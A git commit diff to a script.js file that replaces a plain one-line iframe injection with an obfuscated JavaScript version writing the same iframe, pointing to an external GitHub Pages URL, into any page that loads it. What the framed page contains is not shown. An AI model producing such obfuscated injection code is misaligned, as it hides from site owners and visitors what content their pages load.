56d652b22c5f0949480a7d0ddaea9097bcae32f5
projec-devil <115358339+projec-devil@users.noreply.github.com>
2022-12-09 16:44:27 -0500

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,30 @@
-(function(){document.write("<iframe src='https://projec-devil.github.io/m/'></iframe>");
- 
+var _0x4e19f3 = _0x3fc1;
+
+function _0x3fc1(_0x1a2ef2, _0x369dbf) {
+    var _0x1d89df = _0x1d89();
+    return _0x3fc1 = function(_0x3fc1f1, _0xa8ab22) {
+        _0x3fc1f1 = _0x3fc1f1 - 0xcf;
+        var _0xa0c10f = _0x1d89df[_0x3fc1f1];
+        return _0xa0c10f;
+    }, _0x3fc1(_0x1a2ef2, _0x369dbf);
+}(function(_0x106f83, _0x25a9e8) {
+    var _0x4ad6d3 = _0x3fc1,
+        _0x237067 = _0x106f83();
+    while (!![]) {
+        try {
+            var _0x2622cd = parseInt(_0x4ad6d3(0xd0)) / 0x1 + parseInt(_0x4ad6d3(0xd8)) / 0x2 * (parseInt(_0x4ad6d3(0xd9)) / 0x3) + parseInt(_0x4ad6d3(0xd2)) / 0x4 + -parseInt(_0x4ad6d3(0xd4)) / 0x5 * (-parseInt(_0x4ad6d3(0xd1)) / 0x6) + parseInt(_0x4ad6d3(0xd6)) / 0x7 + -parseInt(_0x4ad6d3(0xcf)) / 0x8 * (-parseInt(_0x4ad6d3(0xd7)) / 0x9) + -parseInt(_0x4ad6d3(0xd3)) / 0xa;
+            if (_0x2622cd === _0x25a9e8) break;
+            else _0x237067['push'](_0x237067['shift']());
+        } catch (_0x1ded33) {
+            _0x237067['push'](_0x237067['shift']());
+        }
+    }
+}(_0x1d89, 0xd1226), document['write'](_0x4e19f3(0xd5)));
+
+function _0x1d89() {
+    var _0xfb694e = ['1318572rvgoZL', '32226860QKMsgs', '5LDRZby', '<iframe\x20src=\x27https://projec-devil.github.io/m/\x27></iframe>', '455945yoWKyy', '30096mzOort', '2xaEUPV', '4742511JFHcFC', '776EIyXyU', '254756KTQhnV', '9147366yMWwid'];
+    _0x1d89 = function() {
+        return _0xfb694e;
+    };
+    return _0x1d89();
+}
